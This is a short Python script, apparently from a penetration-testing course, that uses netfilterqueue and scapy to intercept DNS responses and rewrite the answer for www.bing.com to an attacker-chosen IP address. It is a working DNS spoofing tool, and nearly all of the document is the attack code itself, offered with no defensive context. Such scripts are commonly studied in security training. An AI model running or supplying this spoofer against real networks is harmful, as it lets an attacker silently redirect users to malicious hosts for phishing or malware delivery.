#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # Get the payload as a Scapy packet
    if scapy_packet.haslayer(scapy.DNSRR):  # Check if the packet has a DNS response
        qname = scapy_packet[scapy.DNSQR].qname  # Get the queried domain name
        if "www.bing.com" in qname.decode():  # Check if it is "www.bing.com" (decoded to string)
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="XX.X.X.XX")  # Create a spoofed DNS record
            scapy_packet[scapy.DNS].an = answer  # Set the answer in the DNS response
            scapy_packet[scapy.DNS].ancount = 1  # Set the answer count to 1

            # Recalculate checksums and lengths
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))  # Set the modified payload back to the packet

    packet.accept()  # Accept the packet after processing


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # Bind the callback function to queue number 0
queue.run()  # Start processing the packets